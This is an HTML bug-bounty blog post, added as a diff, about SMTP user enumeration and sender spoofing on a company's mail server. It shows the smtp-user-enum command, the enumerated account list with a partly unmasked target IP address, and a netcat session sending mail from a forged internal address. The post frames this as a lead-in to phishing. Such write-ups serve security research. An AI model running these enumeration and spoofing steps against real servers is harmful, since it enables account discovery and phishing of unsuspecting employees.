@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Just a write-up :: Blog-m4xx</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hey There guys This is my first write-up I&amp;rsquo;ve created this blog site but I&amp;rsquo;m not so regular :P but from now I might be post the blogs more regularly not promising though.
+So today I&amp;rsquo;ll share one of my finding in one public program on bugcrowd platform It was not so cool bug to find or look for but still it triaged P3, So I thought let&amp;rsquo;s share this with you guys."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://m4xx101.github.io/official-blog-website/post/bug-1/" />
+
+
+<link rel="stylesheet" href="https://m4xx101.github.io/official-blog-website/assets/style.css">
+
+
+<link rel="stylesheet" href="https://m4xx101.github.io/official-blog-website/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://m4xx101.github.io/official-blog-website/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://m4xx101.github.io/official-blog-website/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Just a write-up :: Blog-m4xx — " />
+<meta name="twitter:description" content="Hey There guys This is my first write-up I&amp;rsquo;ve created this blog site but I&amp;rsquo;m not so regular :P but from now I might be post the blogs more regularly not promising though.
+So today I&amp;rsquo;ll share one of my finding in one public program on bugcrowd platform It was not so cool bug to find or look for but still it triaged P3, So I thought let&amp;rsquo;s share this with you guys." />
+<meta name="twitter:site" content="https://m4xx101.github.io/official-blog-website/" />
+<meta name="twitter:creator" content=".!" />
+<meta name="twitter:image" content="https://m4xx101.github.io/official-blog-website/img/smtp_server.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Just a write-up :: Blog-m4xx — ">
+<meta property="og:description" content="Hey There guys This is my first write-up I&amp;rsquo;ve created this blog site but I&amp;rsquo;m not so regular :P but from now I might be post the blogs more regularly not promising though.
+So today I&amp;rsquo;ll share one of my finding in one public program on bugcrowd platform It was not so cool bug to find or look for but still it triaged P3, So I thought let&amp;rsquo;s share this with you guys." />
+<meta property="og:url" content="https://m4xx101.github.io/official-blog-website/post/bug-1/" />
+<meta property="og:site_name" content="Just a write-up" />
+<meta property="og:image" content="https://m4xx101.github.io/official-blog-website/img/smtp_server.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-04-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+</head>
+<body class="dark-theme">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://m4xx101.github.io/official-blog-website/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark">></span>
+    <span class="logo__text">hello friend</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner">
+    
+      <li><a href="/official-blog-website/about">About</a></li>
+    
+      <li><a href="/official-blog-website/cors">CORS</a></li>
+    
+      <li><a href="/official-blog-website/proj/1">Projects</a></li>
+    
+      <li><a href="/official-blog-website/tuts/shell_script">Tutorials</a></li>
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+  <div class="content">
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://m4xx101.github.io/official-blog-website/post/bug-1/">Just a write-up</a></h2>
+    <div class="post-meta">
+      <span class="post-date">
+        2019-04-05
+      </span>
+      <span class="post-author">Written by m4xx .!</span>
+    </div>
+
+    
+
+    
+      <img src="https://m4xx101.github.io/official-blog-website/img/smtp_server.png" class="post-cover" />
+    
+
+    <div class="post-content">
+      
+
+<p>Hey There guys This is my first write-up I&rsquo;ve created this blog site but I&rsquo;m not so regular :P but from now I might be post the blogs more regularly not promising though.</p>
+
+<p>So today I&rsquo;ll share one of my finding in one public program on bugcrowd platform It was not so cool bug to find or look for but still it triaged P3, So I thought let&rsquo;s share this with you guys.</p>
+
+<p>So as first basic approach to any target i&rsquo;ve already completed by Recon step I had around 108 list of sub-domains, after doing sub-domain enumeration I took screenshots of all the subdomains using EyeWitness and I was going through all the Snaps, I found something suspicious there was one page which didn&rsquo;t had any content but just one string something like</p>
+
+<blockquote>
+<h2 id="chbfdtyhjyfjkh">ChbfdtyhjYfjkh</h2>
+</blockquote>
+
+<p>That&rsquo;s it so I decided to start with this target first, So I fired up my masscan gave the appropriate parameters and scanned that sub-domain but before that I had done nslookup for that sub-domain so It gave me the IP Address of the server which I then putted in masscan, As a results It has around 4 ports open one of them was 25 which is SMTP, So I thought to test the SMTP-server.</p>
+
+<p>After doing little research about SMTP vulnerabilities I tried to enumerate the users on the server using &ldquo;smtp-user-enum tool&rdquo; which came built-in into kali systems, Following is the command I used:</p>
+
+<pre><code class="language-sh">smtp-user-enum -M VRFY -U /usr/share/wordlists/fern-wifi/common.txt  -t xx.xxx.57.15
+</code></pre>
+
+<p>I&rsquo;m using fern-wifi&rsquo;s commans users list to check for existing users and -t &ldquo;xx.xxx.57.15&rdquo; is my target, In the results I was able to enumerate all the existing users on the server, result was as followed</p>
+
+<pre><code class="language-cmd">
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /usr/share/wordlists/fern-wifi/common.txt
+Target count ............. 1
+Username count ........... 478
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Tue Mar  5 16:51:36 2019 #########
+ exists57.15: acc
+ exists57.15: abc123
+ exists57.15: adfexc
+ exists57.15: aaa
+ exists57.15: access
+ exists57.15: adm
+ exists57.15: admin
+ exists57.15: admin123
+ exists57.15: admin_1
+ exists57.15: admin2
+ exists57.15: adminstrator
+ exists57.15: administrator
+ exists57.15: adminstat
+ exists57.15: adminttd
+ exists57.15: adminuser
+ exists57.15: admn
+ exists57.15: adminview
+ exists57.15: adslolitec
+ exists57.15: adslroot
+ exists57.15: adtran
+ exists57.15: ami
+ exists57.15: anicust
+ exists57.15: anonymous
+ exists57.15: apc
+ exists57.15: cac_admin
+ exists57.15: browsepw
+ exists57.15: cacadmin
+ exists57.15: cascade
+ exists57.15: calvin
+ exists57.15: bluepw
+ exists57.15: cablecom
+ exists57.15: changeme
+ exists57.15: changeme2
+ exists57.15: ccrusr
+ exists57.15: cgadmin
+ exists57.15: cellit
+ exists57.15: cisco
+ exists57.15: citel
+ exists57.15: client
+ exists57.15: Root
+ exists57.15: RSX
+ exists57.15: ROOT500
+ exists57.15: SECURITY
+ exists57.15: SERVICE
+ exists57.15: SESAME
+ exists57.15: SKY_FOX
+ exists57.15: SMDR
+ exists57.15: SPOOLMAN
+ exists57.15: SSA
+ exists57.15: SUPER
+ exists57.15: SUPERUSER
+ exists57.15: SUPPORT
+ exists57.15: SYS
+ exists57.15: SYSADM
+ exists57.15: SYSDBA
+ exists57.15: SYSTEM
+ exists57.15: Service
+ exists57.15: Sharp
+
+63.232.57.15: _Cisco exists
+######## Scan completed at Tue Mar  5 16:53:12 2019 #########
+477 results.
+
+478 queries in 96 seconds (5.0 queries / sec)
+
+</code></pre>
+
+<p>I was be able to gather 478 active users on the server next step was trying to connect to the server and communicate with it so that i can carry out some operations</p>
+
+<p>so I ran Netcat command</p>
+
+<pre><code class="language-sh">nc -nvv target_ip
+</code></pre>
+
+<p>and boom.! I got connection back and was able to run any SMTP commands which I want This was the output:</p>
+
+<pre><code class="language-sh">nc -nvv target_ip
+(UNKNOWN) [target_ip] 25 (smtp) open
+220 something.cheetahmail.com ESMTP
+
+HELO target.com
+250 something.cheetahmail.com
+
+MAIL FROM:it-support@target.com
+250 ok
+
+RCPT To:postmaster@cheetamail.com
+250 ok
+
+DATA
+354 go ahead
+test test test test test test test
+.
+250 ok 1551863013
+</code></pre>
+
+<p>There I was be able to send Email to anyone from their official email address, it is possible to send email from any address, so attacker could pick something trusted like administrator@ or it-support@ , etc. Then there is a higher chance unsuspecting employee would click malicious URL/executable in the email, So for post exploitations we required some Social engineering skills but yeah this is what I had found :P Told you not so cool like RCE or SQL injection hope I&rsquo;ll find it in near future but yet It&rsquo;s a bug so I reported.!</p>
+
+<p>Here is the GIF for no reason:</p>
+
+<p><div style="width:100%;height:0;padding-bottom:104%;position:relative;"><iframe src="https://giphy.com/embed/de9SDw6PGRsubN1o3X" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/reaction-mood-de9SDw6PGRsubN1o3X">via GIPHY</a></p></p>
+
+<p>Ignore the mistakes if any! because this is my first write-up :P</p>
+
+<p>*Note:- There&rsquo;s one Night-mode/Day-mode switch on this website use it:P.!</p>
+
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://m4xx101.github.io/official-blog-website/post/insta_hack/">
+                <span class="button__text">Instagram Hack.!</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://m4xx101.github.io/official-blog-website/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark">></span>
+    <span class="logo__text">hello friend</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2019 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>Author <a href="https://twitter.com/Deepak_maxx">m4xx</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://m4xx101.github.io/official-blog-website/assets/main.js"></script>
+<script src="https://m4xx101.github.io/official-blog-website/assets/prism.js"></script>
+
+  
+</div>
+
+</body>
+</html>
